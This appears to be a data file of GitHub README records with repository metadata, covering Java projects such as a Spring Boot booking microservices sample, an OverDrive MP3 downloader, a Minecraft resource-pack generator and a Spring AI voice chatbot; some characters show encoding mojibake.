5.  **Add tests** (if necessary): If your contribution includes significant changes, write tests to ensure the code functions as expected.    
6.  **Commit your changes**:
````bash
git add .
git commit -m ""Description of the changes made""
````

7. **Push to the repository**:
````bash
git push origin feature-name
````

8.  **Open a Pull Request**: On GitHub, open a Pull Request to the main repository with a clear description of your changes.
    

#### **7.2 Support**

If you encounter issues using the **Java Language System (JLS)** or need assistance, there are several ways to get support:

1.  **Issues on GitHub**:
    
    -   If you find a bug or have a question, open an ""Issue"" on the [GitHub repository](https://github.com/KelvenCassamo/java-language-system/issues) so that I or other developers can help.
        
    -   Be as specific as possible when describing the problem. Include error logs, screenshots, and expected behavior.
        
-   **Forums and Communities**:
    
    -   **Stack Overflow**: Ask or search for issues related to JLS with the tags `#jls` or `#java-language-system`.
        
    -   **Reddit**: Participate in discussions about software internationalization and Java on the [subreddit r/java](https://www.reddit.com/r/java/).


**Email Support**:

-   If you need more direct support, send an email to my address: `kelvencassamo9@gmail.com`.



",3,1,3,MIT,0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
WinterAlexander/HanziResourcePack,master,"# HanziResourcePack

**Downloads**: https://github.com/WinterAlexander/HanziResourcePack/releases

This repo is a generator for minecraft resource packs. It adds Ê±âÂ≠ó (hanzi) on top of an existing minecraft resource pack's 
block textures so that the entire game shows Ê±âÂ≠ó characters on every block. The ""Hard"" version of this pack strips away 
textures so the player must read the chinese in order to play the game. Use the pinyin version of the release to see the 
pinyin on top of the Ê±âÂ≠ó onto textures.

Note that the chinese translation are found using the game's files and the pinyin is generated using [hanzi-tools](https://github.com/peterolson/hanzi-tools).

## Demonstration:


https://github.com/user-attachments/assets/14e8c07f-79b3-4144-8b65-40ef8a7dcfa2

## Supporting this project

I am a software developper and I do game development on my free time. My focus is generally divided between various projects. If you want this project to receive more attention, feel free to give me a tip (please specify this project in the tip message!). You may also include a specific feature you would like to be seen worked on in the tip message. Cheers!

https://paypal.me/winter2277
",1,3,1,Apache-2.0,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
brianpipa/OverdriveMP3Downloader,main,"# UPDATE: As of February 1, 2025 (or so), this no longer works. Overdrive has removed the ability to download the ODM file (it returns a 404 error now). I'm leaving this project online in case the code helps anyone.

## OverDrive Libby MP3 Downloader

As of late 2024, OverDrive discontinued their OverDrive Media Console application in favor of the Libby application. This works to play the audiobooks, but doesn't allow you access to the raw, non-DRM MP3 files any more. This means many people who use things like standalone MP3 players can no longer use them to listen to audiobooks from the library. This code allows you to again download the MP3s.  

NOTE: There's no telling how long this will work, but if you don't see a message here saying it no longer works, it should still work.

## Thanks

This builds upon the work that was done by [chbrown](https://github.com/chbrown/overdrive) - my code is just a java rewrite of his code so it's easier to run on other operating systems, like Windows. If you are on linux, I encourage you to use his script - it works great.

## Requirements
* java installed and working - it should be at least version 8. I'm not going to teach you how to do that - google it if you don't know. You should have your system setup so that you can type java -version in a terminal/command prompt and it will work and tell you what version of java you have installed.
* an .odm file from the library (instructions below)
* This compiled code in the form of the .jar file - see the [releases page](https://github.com/brianpipa/OverdriveMP3Downloader/releases) to download it.

## How it works
When you run it, it will create a license file next to the ODM file, it will create a folder next to your ODM file with the same name and it will put the MP3s and the cover image in the new folder. For example, if your ODM file is at C:\Downloads\BookName_987654321098_12345678.odm, when you run it you will then have:
* C:\Downloads\BookName_987654321098_12345678 (folder)
* C:\Downloads\BookName_987654321098_12345678.odm.license
* C:\Downloads\BookName_987654321098_12345678\\*.mp3
* C:\Downloads\BookName_987654321098_12345678\\*.jpg

NOTE: Once you have the .license file, do not delete it until you have all the MP3 files. They only allow you to get the license ONCE. 

You can rerun the code on the ODM file multiple times, but it will skip any files you already have. If you need it to download the file(s) again, delete the MP3s or the cover image and it will re-download them as long as the license file is still in place.

## Obtain an ODM file
This is a little trickier than it used to be. Here is how I do it... Once you checkout an audiobook from OverDrive/Libby, go to your loans on the OverDrive site for you library. This URL will look like https://YOURLIBRARY.overdrive.com/account/loans - some actual examples are:  
* https://wakegov.overdrive.com/account/loans
* https://hcplc.overdrive.com/account/loans
* https://alexandria.overdrive.com/account/loans

Once there, you will see a button on your audiobook that says ""Listen now in browser"". Right-click on that button and copy the url, then paste it into a new tab in your browser. The link will look something like this: https://YOURLIBRARY.overdrive.com/media/download/audiobook-overdrive/1234567

Now, in your browser's address bar, edit that URL and change audiobook-overdrive to audiobook-mp3. So for example, if the URL was https://wakegov.overdrive.com/media/download/audiobook-overdrive/1234567 then it should now be https://wakegov.overdrive.com/media/download/audiobook-mp3/1234567

Once you have the URL changed, hit enter to visit that URL. That should cause your browser to download the .odm file which we will need for the next step. The .odm file will be in whatever folder you have your browser configured to use for your downloads.

ALTERNATE WAY FOR FIREFOX USERS  
Use Firefox and install this plugin: https://addons.mozilla.org/en-US/firefox/addon/overdrive-download-odm-button/ and it will change the button on the Overdrive page to an ODM download button

## Running the code to get the MP3s
I recommend putting the .jar file somewhere that makes sense for you. Maybe C:\OverdriveMP3Downloader or ~/username/apps/overdrivemp3downloader or whatever works for you. Now first to see if this is working, open a command prompt/terminal in the folder that the jar file is in. For this first test to make sure it works, copy your ODM file into this folder. Let's assume for this example, your ODM file is MyAudiobook.odm. So you should have both overdrivemp3.jar and MyAudiobook.odm in the same folder.

Now from the command prompt/terminal you opened, type `java -jar overdrivemp3.jar MyAudiobook.odm`
and that should start the download of the MP3 files and you should see something like this:
![sample](https://github.com/brianpipa/OverdriveMP3Downloader/blob/main/README-images/terminal-run.png?raw=true)

Once you verify this works, you can leave the ODM file wherever you want and just pass it in as a parameter like `java -jar overdrivemp3.jar path\to\MyAudiobook.odm` and you can even try use the [runscripts](https://github.com/brianpipa/OverdriveMP3Downloader/tree/main/runscripts) On Windows, you can drag an ODM file onto the Windows batch file and it will download the MP3s for you. If you are even more clever, you can configure your browser to automatically run this script on any ODM file you download by associating (in the browser) .odm files with the script. 

Once you have the MP3s, you can delete the .odm file and the license file. Don't forget to delete the MP3s once they are due back to the library!

",2,1,1,GPL-3.0,0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
meysamhadeli/booking-microservices-java-spring-boot,main,"<div align=""center"" style=""margin-bottom:20px"">
  <img src=""assets/logo.png"" alt=""booking-microservices-java-spring-boot"" />
    <div align=""center"">
                 <a href=""https://github.com/meysamhadeli/booking-microservices-java-spring-boot/blob/main/LICENSE""><img alt=""build-status""          src=""https://img.shields.io/github/license/meysamhadeli/booking-microservices-java-spring-boot?color=%234275f5&style=flat-square""/></a>
    </div>
</div>

> üöÄ **A practical and imaginary microservices for implementing an infrastructure for up and running distributed system with the latest technology and architecture like Vertical Slice Architecture, Event Driven Architecture, CQRS, DDD, gRpc, MongoDB, RabbitMq in Java Spring Boot.**

> üí° **This project is not business-oriented and most of my focus was in the thechnical part for implement a distributed system with a sample project. In this project I implemented some concept in microservices like Messaging, Tracing, Event Driven Architecture, Vertical Slice Architecture, CQRS, DDD and gRpc.**

**You can find `.Net` ported of this project in this link:**
üîó [booking-microservices](https://github.com/meysamhadeli/booking-microservices)

<div>
  <a href=""https://gitpod.io/#https://github.com/meysamhadeli/booking-microservices-java-spring-boot""><img alt=""Open in Gitpod"" src=""https://gitpod.io/button/open-in-gitpod.svg""/></a>
</div>
<div>
  <a href='https://codespaces.new/meysamhadeli/booking-microservices-java-spring-boot?quickstart=1'><img alt='Open in GitHub Codespaces' src='https://github.com/codespaces/badge.svg'></a>
</div>

# Table of Contents

- [The Goals of This Project](#the-goals-of-this-project)
- [Plan](#plan)
- [Technologies - Libraries](#technologies---libraries)
- [The Domain and Bounded Context - Service Boundary](#the-domain-and-bounded-context---service-boundary)
- [Structure of Project](#structure-of-project)
- [How to Run](#how-to-run)
  - [Docker Compose](#docker-compose)
  - [Build](#build)
  - [Run](#run)
  - [Test](#test)
- [Documentation Apis](#documentation-apis)
- [Support](#support)
- [Contribution](#contribution)

## The Goals of This Project

- :sparkle: Using `Vertical Slice Architecture` for `architecture` level.
- :sparkle: Using `Spring MVC` as a `Web Framework`.
- :sparkle: Using `Domain Driven Design (DDD)` to implement all `business processes` in microservices.
- :sparkle: Using `Spring AMQP` on top of `Rabbitmq` for `Event Driven Architecture` between our microservices.
- :sparkle: Using `gRPC` for `internal communication` between our microservices.
- :sparkle: Using `CQRS` implementation with `Mediator` library.
- :sparkle: Using `Spring Data JPA` for `data persistence` and `ORM` in `write side` with `Postgres`.
- :sparkle: Using `Spring Data MongoDB` for `data persistence` and `ORM` in `read side` with `MongoDB`.
- :sparkle: Using `Inbox Pattern` for ensuring message idempotency for receiver and `Exactly once Delivery`.
- :sparkle: Using `Outbox Pattern` for ensuring no message is lost and there is at `At Least One Delivery`.
- :sparkle: Using `Unit Testing` for testing small units and mocking our dependencies with `Mockito`.
- :sparkle: Using `End-To-End Testing` and `Integration Testing` for testing `features` with all dependencies using `testcontainers`.
- :sparkle: Using `Spring Validator` and a `Validation Pipeline Behaviour` on top of `Mediator`.
- :sparkle: Using `Springdoc Openapi` for generating `OpenAPI documentation` in Spring Boot.
- :sparkle: Using `OpenTelemetry Collector` for collecting `Metrics`, `Tracings` and `Structured Logs`.
- :sparkle: Using `Kibana` for `Logging` top of `OpenTelemetry Collector`.
- :sparkle: Using `Jaeger` for `Distributed Tracing` top of `OpenTelemetry Collector`.
- :sparkle: Using `OpenTelemetry` for monitoring on top of `Prometheus` and `Grafana`.
- :sparkle: Using `Keycloak` for authentication and authorization base on `OpenID-Connect` and `OAuth2`.
- :sparkle: Using `Spring Cloud Gateway` as a microservices `gateway`.


## Plan

> üåÄThis project is a work in progress, new features will be added over time.üåÄ

I will try to register future goals and additions in the [Issues](https://github.com/meysamhadeli/booking-microservices-java-spring-boot/issues) section of this repository.

High-level plan is represented in the table

| Feature           | Status         |
|-------------------| -------------- |
| API Gateway       | Completed ‚úîÔ∏è   |
| Keycloak Service  | Completed ‚úîÔ∏è   |
| Flight Service    | Completed ‚úîÔ∏è   |
| Passenger Service | Completed ‚úîÔ∏è   |
| Booking Service   | Completed ‚úîÔ∏è   |
| Building Blocks   | Completed ‚úîÔ∏è   |


## Technologies - Libraries
- ‚úîÔ∏è **[Spring Boot](https://github.com/spring-projects/spring-boot/tree/main)** - Framework for building Java applications with pre-configured defaults and embedded server support.
- ‚úîÔ∏è **[Spring AMQP](https://github.com/spring-projects/spring-amqp)** - Simplifies messaging using RabbitMQ with declarative configuration and templates.
- ‚úîÔ∏è **[Spring Data JPA](https://github.com/spring-projects/spring-data-jpa)** - Enhances JPA with repository abstractions and advanced query capabilities.
- ‚úîÔ∏è **[Spring Data MongoDB](https://github.com/spring-projects/spring-data-mongodb)** - Provides seamless MongoDB integration with Spring-based applications.
- ‚úîÔ∏è **[Spring Security](https://github.com/spring-projects/spring-security)** - Comprehensive security framework for authentication and authorization in Java applications.
- ‚úîÔ∏è **[Keycloak](https://github.com/keycloak/keycloak)** - A identity and access management solution supporting OpenID Connect and OAuth 2.0.
- ‚úîÔ∏è **[PostgreSQL](https://github.com/pgjdbc/pgjdbc)** - Official JDBC driver for PostgreSQL, enabling Java applications to interact with PostgreSQL databases.
- ‚úîÔ∏è **[Springdoc OpenAPI](https://github.com/springdoc/springdoc-openapi)** - Automatically generates OpenAPI 3 documentation for Spring Boot projects.
- ‚úîÔ∏è **[Swagger Core](https://github.com/swagger-api/swagger-core)** - Core library for building and consuming Swagger-compliant APIs.
- ‚úîÔ∏è **[OpenTelemetry Collector](https://github.com/open-telemetry/opentelemetry-collector/tree/main)** - Collects, processes, and exports telemetry data (traces, metrics, logs) for observability.
- ‚úîÔ∏è **[Lombok](https://github.com/projectlombok/lombok)** - Reduces boilerplate code in Java by generating common methods like getters and setters.
- ‚úîÔ∏è **[Flyway](https://github.com/flyway/flyway)** - Database migration tool for version-controlled and repeatable schema changes.
- ‚úîÔ∏è **[JPA Buddy](https://jpa-buddy.com)** - Productivity tool for working with JPA and Hibernate, simplifying development and debugging.
- ‚úîÔ∏è **[UUID Creator](https://github.com/f4b6a3/uuid-creator)** - Library for generating UUIDs in various formats and versions.
- ‚úîÔ∏è **[QueryDSL](https://github.com/querydsl/querydsl)** - Enables type-safe queries for JPA, SQL, and other persistence layers.
- ‚úîÔ∏è **[Reflections](https://github.com/ronmamo/reflections)** - Facilitates metadata scanning and classpath resource analysis in Java.
- ‚úîÔ∏è **[gRPC Spring](https://github.com/grpc-ecosystem/grpc-spring)** - Integration of gRPC with Spring Boot for building high-performance RPC services.
- ‚úîÔ∏è **[Testcontainers](https://github.com/testcontainers/testcontainers-java)** - Provides lightweight, disposable Docker containers for testing purposes.
- ‚úîÔ∏è **[Mockito](https://github.com/mockito/mockito)** - Popular mocking framework for writing clean, maintainable unit tests in Java.
- ‚úîÔ∏è **[JUnit](https://github.com/junit-team)** - Essential testing framework for Java developers, supporting unit and integration testing.


## The Domain And Bounded Context - Service Boundary

- `Keycloak Service`: The Keycloak Service is a identity provider for the authentication and authorization of users using [Keycloak](https://github.com/keycloak/keycloak). This service is responsible for creating new users and their corresponding roles permissions and handeling authentication and authorization with OpenID-Connect and OAuth2.

- `Flight Service`: The Flight Service is a bounded context `CRUD` service to handle flight related operations.

- `Passenger Service`: The Passenger Service is a bounded context for managing passenger information, tracking activities and subscribing to get notification for out of stock products.

- `Booking Service`: The Booking Service is a bounded context for managing all operation related to booking ticket.

![](./assets/booking-microservices-java-spring-boot.png)

## Structure of Project

In this project I used a mix of [clean architecture](https://jasontaylor.dev/clean-architecture-getting-started/), [vertical slice architecture](https://jimmybogard.com/vertical-slice-architecture/) and I used [feature folder structure](http://www.kamilgrzybek.com/design/feature-folders/) to structure my files.

I used [yarp reverse proxy](https://microsoft.github.io/reverse-proxy/articles/index.html) to route synchronous and asynchronous requests to the corresponding microservice. Each microservice has its dependencies such as databases, files etc. Each microservice is decoupled from other microservices and developed and deployed separately. Microservices talk to each other with Rest or gRPC for synchronous calls and use RabbitMq or Kafka for asynchronous calls.

We have a separate microservice [Keycloak Service](https://github.com/keycloak/keycloak) for authentication and authorization of each request. Once signed-in users are issued a JWT token. This token is used by other microservices to validate the user, read claims and allow access to authorized/role specific endpoints.

I used [RabbitMQ](https://github.com/rabbitmq) as my MessageBroker for async communication between microservices using the eventual consistency mechanism. Each microservice uses [MassTransit](https://github.com/MassTransit/MassTransit) to interface with [RabbitMQ](https://github.com/rabbitmq) providing, messaging, availability, reliability, etc.

Microservices are `event based` which means they can publish and/or subscribe to any events occurring in the setup. By using this approach for communicating between services, each microservice does not need to know about the other services or handle errors occurred in other microservices.

After saving data in write side, I save a [Internal Command](https://github.com/kgrzybek/modular-monolith-with-ddd#38-internal-processing) record in my Persist Messages storage (like something we do in outbox pattern) and after committing transaction in write side, trigger our command handler in read side  and this handler could save their read models in our MongoDB database.

I treat each request as a distinct use case or slice, encapsulating and grouping all concerns from front-end to back.
When adding or changing a feature in an application in n-tire architecture, we are typically touching many ""layers"" in an application. We are changing the user interface, adding fields to models, modifying validation, and so on. Instead of coupling across a layer, we couple vertically along a slice. We `minimize coupling` `between slices`, and `maximize coupling` `in a slice`.

With this approach, each of our vertical slices can decide for itself how to best fulfill the request. New features only add code, we're not changing shared code and worrying about side effects.

<div align=""center"">
  <img src=""./assets/vertical-slice-architecture.png"" />
</div>

Instead of grouping related action methods in one controller, as found in traditional controllers, I used the [REPR pattern](https://deviq.com/design-patterns/repr-design-pattern). Each action gets its own small endpoint, consisting of a route, the action, and an `IMediator` instance. The request is passed to the `IMediator` instance, routed through a [`Mediator pipeline`](https://lostechies.com/jimmybogard/2014/09/09/tackling-cross-cutting-concerns-with-a-mediator-pipeline/) where custom middleware can log, validate and intercept requests. The request is then handled by a request specific `IRequestHandler` which performs business logic before returning the result.

The use of the [mediator pattern](https://dotnetcoretutorials.com/2019/04/30/the-mediator-pattern-in-net-core-part-1-whats-a-mediator/) in my controllers creates clean and thin controllers. By separating action logic into individual handlers we support the [Single Responsibility Principle](https://en.wikipedia.org/wiki/Single_responsibility_principle) and [Don't Repeat Yourself principles](https://en.wikipedia.org/wiki/Don%27t_repeat_yourself), this is because traditional controllers tend to become bloated with large action methods and several injected `Services` only being used by a few methods.

I used CQRS to decompose my features into small parts that makes our application:

- Maximize performance, scalability and simplicity.
- Easy to maintain and add features to. Changes only affect one command or query, avoiding breaking changes or creating side effects.
- It gives us better separation of concerns and cross-cutting concern (with help of mediator behavior pipelines), instead of bloated service classes doing many things.

Using the CQRS pattern, we cut each business functionality into vertical slices, for each of these slices we group classes (see [technical folders structure](http://www.kamilgrzybek.com/design/feature-folders)) specific to that feature together (command, handlers, infrastructure, repository, controllers, etc). In our CQRS pattern each command/query handler is a separate slice. This is where you can reduce coupling between layers. Each handler can be a separated code unit, even copy/pasted. Thanks to that, we can tune down the specific method to not follow general conventions (e.g. use custom SQL query or even different storage). In a traditional layered architecture, when we change the core generic mechanism in one layer, it can impact all methods.


## How to Run

> ### Docker Compose

Use the command below to run our `infrastructure` with `docker` using the `docker-compose.infrastructure.yaml` file at the root of the app:
```
docker-compose -f ./deployments/docker-compose/docker-compose.infrastructure.yaml up -d
```

> ### Build
To `build` all microservices, run this command in the `root` of each microservice where the `pom.xml` file is located:
```bash
mvn clean install
```

> ### Run
To `run` each microservice, run this command in the `root` of each microservice where the `pom.xml` file is located:
```bash
mvn spring-boot:run
```

> ### Test

To `test` all microservices, run this command in the `root` of each microservice where the `pom.xml` file is located:
```bash
dotnet test
```

> ### Documentation Apis

Each microservice provides `API documentation` and navigate to `/swagger-ui/index.html` to visit list of endpoints.

As part of API testing, I created the [booking.rest](./booking.rest) file which can be run with the [REST Client](https://github.com/Huachao/vscode-restclient) `VSCode plugin`.

# Support

If you like my work, feel free to:

- ‚≠ê this repository. And we will be happy together :)

Thanks a bunch for supporting me!

## Contribution

Thanks to all [contributors](https://github.com/meysamhadeli/booking-microservices-java-spring-boot/graphs/contributors), you're awesome and this wouldn't be possible without you! The goal is to build a categorized, community-driven collection of very well-known resources.

Please follow this [contribution guideline](./CONTRIBUTION.md) to submit a pull request or create the issue.

## Project References & Credits

- [https://github.com/jbogard/ContosoUniversityDotNetCore-Pages](https://github.com/jbogard/ContosoUniversityDotNetCore-Pages)
- [https://github.com/kgrzybek/modular-monolith-with-ddd](https://github.com/kgrzybek/modular-monolith-with-ddd)
- [https://github.com/oskardudycz/cqrs-is-simpler-with-java](https://github.com/oskardudycz/cqrs-is-simpler-with-java)

## License
This project is made available under the MIT license. See [LICENSE](https://github.com/meysamhadeli/booking-microservices-java-spring-boot/blob/main/LICENSE) for details.
",0,0,1,MIT,0,28.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
damithch/DamithPayment,main,"# DamithPayment ‚ú®

**DamithPayment** is a Java-based project designed to demonstrate payment processing functionalities. Developed as part of a university assignment, this project utilizes the **MVC (Model-View-Controller)** architecture and incorporates fundamental Object-Oriented Programming (OOP) principles. The project is in its early stages, with room for future enhancements and optimizations.

---

## üìä Project Overview

This project was created for the **Object-Oriented Programming** module during **Year 2, Semester 1** of university. It showcases key programming concepts such as:

- **Encapsulation**
- **Inheritance**
- **Polymorphism**
- **Abstraction**

The system is built to simulate basic payment processing while adhering to the MVC design pattern for better separation of concerns and maintainability.

---

## üîß Technologies Used

- **Java**: The primary programming language used.
- **Eclipse IDE**: The development environment.
- **MVC Architecture**: For structuring the application.

---

## üë• Contributors

- **damithch** (Owner and Developer)
---

## üîí License

This project currently does not specify a license. Please contact the owner for usage guidelines.

---

## üìà Repository Details

- **Repository Name**: DamithPayment
- **Owner**: damithch
- **Default Branch**: main
- **Created At**: 2024-12-11
- **Last Updated**: 2024-12-11

---

## üé® Features

- Implementation of core **OOP concepts**
- Use of **MVC architecture** for scalability
- Simulates a basic payment processing system
- Developed with **clean and modular code**

---

## üîÑ Future Enhancements

- Adding a **user interface** for better interaction
- Integration with real-world payment APIs
- Improved error handling and logging
- Detailed documentation and unit tests
---

## üåü Acknowledgments

This project was developed as part of an academic assignment. Special thanks to the lecturers and peers who provided guidance and feedback throughout its development.

---

Feel free to contribute, raise issues, or provide suggestions to improve **DamithPayment**! üöÄ

",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
tzolov/voice-assistant-chatbot,main,"# Voice Assistant ChatBot

This is a Spring Boot application that serves as a voice-enabled chatbot assistant. 
It uses [Spring AI](https://docs.spring.io/spring-ai/reference/index.html) to integrate with OpenAI and to leverages its [audio generation](https://platform.openai.com/docs/guides/audio) features to process voice inputs, and respond with audio outputs. 
The application uses, plain, Java's Sound API for audio recording and playback.

By default, the assistant impersonates Marvin, using the [marvin.paranoid.android.txt](https://github.com/tzolov/voice-assistant-chatbot/blob/main/src/main/resources/marvin.paranoid.android.txt) system prompt.

<img src=""doc/marvin-transparent.svg"" width=""200"" align=""center""/>

> Marvin - a Paranoid Android, the highly intelligent yet perpetually depressed and pessimistic robot in the Universe. 
> With a brain the size of a planet but endlessly underwhelmed and irritated by the menial tasks given to him... 

Use the `chatbot.prompt=<file-name.txt>` property to configure a different personality.
For example the `chatbot.prompt=classpath:/psychoanalyst.txt`, will set the [psychoanalyst.txt](https://github.com/tzolov/voice-assistant-chatbot/blob/main/src/main/resources/psychoanalyst.txt) prompt to impersonate a psychoanalyst.

## Features

- **Voice Input and Output**: Communicates using recorded voice input and generates audio responses.
- **Chat Memory**: Maintains context using in-memory chat memory.
- **System Prompt**: Configurable system prompt to define the chatbot's behavior.
- **Spring AI Integration**: Utilizes Spring AI's [ChatClient](https://docs.spring.io/spring-ai/reference/api/chatclient.html) to interact with a chat model.

## Requirements

- **Java**: Java 17 or higher.
- **Spring Boot**: Version 3.2.x or higher.
- **Dependencies**: `spring-ai-openai-spring-boot-starter`, version `1.0.0-SNAPSHOT` or the forthcoming M5.
- **OpenAI API Key**: Follow the Spring AI OpenAI integration [instruction](https://docs.spring.io/spring-ai/reference/api/chat/openai-chat.html) to configure your access to OpenAI.
- **OpenAI Model**: Currently only the `gpt-4o-audio-preview` model support input/output audio modality.

## Getting Started

### Clone the Repository

```bash
git clone https://github.com/your-repo/assistant-application.git
cd assistant-application
```

### Configuration

```properties
spring.main.web-application-type=none

# System prompt message
chatbot.prompt=classpath:/marvin.paranoid.android.txt

# OpenAI API key
spring.ai.openai.api-key=${OPENAI_API_KEY}

# Set the OpenAI model
spring.ai.openai.chat.options.model=gpt-4o-audio-preview

# Output audio configuration
spring.ai.openai.chat.options.output-modalities=text,audio
spring.ai.openai.chat.options.output-audio.voice=ONYX
spring.ai.openai.chat.options.output-audio.format=WAV
```

### Build the Application

```bash
./mvnw clean install
```

### Run the Application

```bash
java -jar ./target/voice-assistant-chatbot-0.0.1-SNAPSHOT.jar
```

```
 ‚ñó‚ñÑ‚ñÑ‚ññ‚ñó‚ñÑ‚ñÑ‚ññ ‚ñó‚ñÑ‚ñÑ‚ññ ‚ñó‚ñÑ‚ñÑ‚ñÑ‚ññ‚ñó‚ññ  ‚ñó‚ññ ‚ñó‚ñÑ‚ñÑ‚ññ     ‚ñó‚ñÑ‚ññ ‚ñó‚ñÑ‚ñÑ‚ñÑ‚ññ                                    
‚ñê‚ñå   ‚ñê‚ñå ‚ñê‚ñå‚ñê‚ñå ‚ñê‚ñå  ‚ñà  ‚ñê‚ñõ‚ñö‚ññ‚ñê‚ñå‚ñê‚ñå       ‚ñê‚ñå ‚ñê‚ñå  ‚ñà                                      
 ‚ñù‚ñÄ‚ñö‚ññ‚ñê‚ñõ‚ñÄ‚ñò ‚ñê‚ñõ‚ñÄ‚ñö‚ññ  ‚ñà  ‚ñê‚ñå ‚ñù‚ñú‚ñå‚ñê‚ñå‚ñù‚ñú‚ñå    ‚ñê‚ñõ‚ñÄ‚ñú‚ñå  ‚ñà                                      
‚ñó‚ñÑ‚ñÑ‚ñû‚ñò‚ñê‚ñå   ‚ñê‚ñå ‚ñê‚ñå‚ñó‚ñÑ‚ñà‚ñÑ‚ññ‚ñê‚ñå  ‚ñê‚ñå‚ñù‚ñö‚ñÑ‚ñû‚ñò    ‚ñê‚ñå ‚ñê‚ñå‚ñó‚ñÑ‚ñà‚ñÑ‚ññ                                    
‚ñó‚ñÑ‚ñÑ‚ññ  ‚ñó‚ñÑ‚ññ ‚ñó‚ñÑ‚ñÑ‚ññ  ‚ñó‚ñÑ‚ññ ‚ñó‚ññ  ‚ñó‚ññ ‚ñó‚ñÑ‚ññ ‚ñó‚ñÑ‚ñÑ‚ñÑ‚ññ‚ñó‚ñÑ‚ñÑ‚ñÑ      ‚ñó‚ñÑ‚ññ ‚ñó‚ññ  ‚ñó‚ññ‚ñó‚ñÑ‚ñÑ‚ñÑ ‚ñó‚ñÑ‚ñÑ‚ññ  ‚ñó‚ñÑ‚ññ ‚ñó‚ñÑ‚ñÑ‚ñÑ‚ññ‚ñó‚ñÑ‚ñÑ‚ñÑ 
‚ñê‚ñå ‚ñê‚ñå‚ñê‚ñå ‚ñê‚ñå‚ñê‚ñå ‚ñê‚ñå‚ñê‚ñå ‚ñê‚ñå‚ñê‚ñõ‚ñö‚ññ‚ñê‚ñå‚ñê‚ñå ‚ñê‚ñå  ‚ñà  ‚ñê‚ñå  ‚ñà    ‚ñê‚ñå ‚ñê‚ñå‚ñê‚ñõ‚ñö‚ññ‚ñê‚ñå‚ñê‚ñå  ‚ñà‚ñê‚ñå ‚ñê‚ñå‚ñê‚ñå ‚ñê‚ñå  ‚ñà  ‚ñê‚ñå  ‚ñà
‚ñê‚ñõ‚ñÄ‚ñò ‚ñê‚ñõ‚ñÄ‚ñú‚ñå‚ñê‚ñõ‚ñÄ‚ñö‚ññ‚ñê‚ñõ‚ñÄ‚ñú‚ñå‚ñê‚ñå ‚ñù‚ñú‚ñå‚ñê‚ñå ‚ñê‚ñå  ‚ñà  ‚ñê‚ñå  ‚ñà    ‚ñê‚ñõ‚ñÄ‚ñú‚ñå‚ñê‚ñå ‚ñù‚ñú‚ñå‚ñê‚ñå  ‚ñà‚ñê‚ñõ‚ñÄ‚ñö‚ññ‚ñê‚ñå ‚ñê‚ñå  ‚ñà  ‚ñê‚ñå  ‚ñà
‚ñê‚ñå   ‚ñê‚ñå ‚ñê‚ñå‚ñê‚ñå ‚ñê‚ñå‚ñê‚ñå ‚ñê‚ñå‚ñê‚ñå  ‚ñê‚ñå‚ñù‚ñö‚ñÑ‚ñû‚ñò‚ñó‚ñÑ‚ñà‚ñÑ‚ññ‚ñê‚ñô‚ñÑ‚ñÑ‚ñÄ    ‚ñê‚ñå ‚ñê‚ñå‚ñê‚ñå  ‚ñê‚ñå‚ñê‚ñô‚ñÑ‚ñÑ‚ñÄ‚ñê‚ñå ‚ñê‚ñå‚ñù‚ñö‚ñÑ‚ñû‚ñò‚ñó‚ñÑ‚ñà‚ñÑ‚ññ‚ñê‚ñô‚ñÑ‚ñÑ‚ñÄ
voice-assistant-chatbot:0.0.1-SNAPSHOT/Spring AI:1.0.0-SNAPSHOT/Spring Boot:3.4.0

2024-12-01T11:00:11.274+01:00  INFO 31297 --- [voice-assistant-chatbot] [           main] s.a.d.a.m.VoiceAssistantApplication      : Started VoiceAssistantApplication in 0.827 seconds (process running for 1.054)

Recording your question ... press <Enter> to stop!
```

### Interacting with the Assistant

1. Speak your query when prompted.
2. Press `Enter` to stop recording.
3. Listen to the assistant‚Äôs response, which will be played back.

Press `Crl+C` to exit. 

## Code Overview

The application consists of two classes the `VoiceAssistantApplication.java` and the utility `Audio`.

The [VoiceAssistantApplication.java](https://github.com/tzolov/voice-assistant-chatbot/blob/main/src/main/java/spring/ai/demo/ai/marvin/VoiceAssistantApplication.java) is the  main class initializes the chatbot with:

1. **ChatClient**: Configures the chatbot using the system prompt and an in-memory chat memory advisor.
2. **Command Line Runner**: Implements a loop to continuously record, process, and respond to user input.
3. **Audio Recording and Playback**: Manages voice input and output using the [Audio](https://github.com/tzolov/voice-assistant-chatbot/blob/main/src/main/java/spring/ai/demo/ai/marvin/Audio.java) utility for recording audio input from the user and playing back audio responses.
It is a single class implementation, leveraging the pain `Java Sound API` for capturing and playback audio. 
",0,0,1,Apache-2.0,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
Flectone/FlectonePulse,master,"<div align=""center"">
  <h3>
    <a href=""README.md"">EN</a> | 
    <a href=""README-RU.md"">–†–£</a>
  </h3>
</div>

![pulse](https://flectone.net/pulse/flectonepulse.png)  
<div class=""center-row"" align=""center"">
    <h1> FlectonePulse ‚Äî Every Message Under Your Control! </h1>
    <a href=""https://www.spigotmc.org/""><img src=""https://flectone.net/pulse/bukkit.svg"" alt=""bukkit"" class=""hover-brightness""></a>
    <a href=""https://www.spigotmc.org/""><img src=""https://flectone.net/pulse/spigot.svg"" alt=""spigot"" class=""hover-brightness""></a>
    <a href=""https://papermc.io/""><img src=""https://flectone.net/pulse/paper.svg"" alt=""paper"" class=""hover-brightness""></a>
    <a href=""https://purpurmc.org/""><img src=""https://flectone.net/pulse/purpur.svg"" alt=""purpur"" class=""hover-brightness""></a>
    <a href=""https://papermc.io/software/folia""><img src=""https://flectone.net/pulse/folia.svg"" alt=""folia"" class=""hover-brightness""></a>
    <a href=""https://www.spigotmc.org/wiki/bungeecord/""><img src=""https://flectone.net/pulse/bungeecord.svg"" alt=""bungeecord"" class=""hover-brightness""></a>
    <a href=""https://papermc.io/software/velocity""><img src=""https://flectone.net/pulse/velocity.svg"" alt=""velocity"" class=""hover-brightness""></a>
</div>

---

## üèÜ Advantages That Will Blow Your Mind üò±

- ‚ö° **Maximized Asynchrony**  
All operations **never lag** the main thread, and configs load in the background. Your server **won‚Äôt stutter** even under peak load!  

- üè≠ **Flexible Architecture with Google Guice**  
Dependency injection? Easy! **Guice** keeps code clean and logic modular. Want to add your own feature? **No problem**‚Äîthe system is built for extensions!  

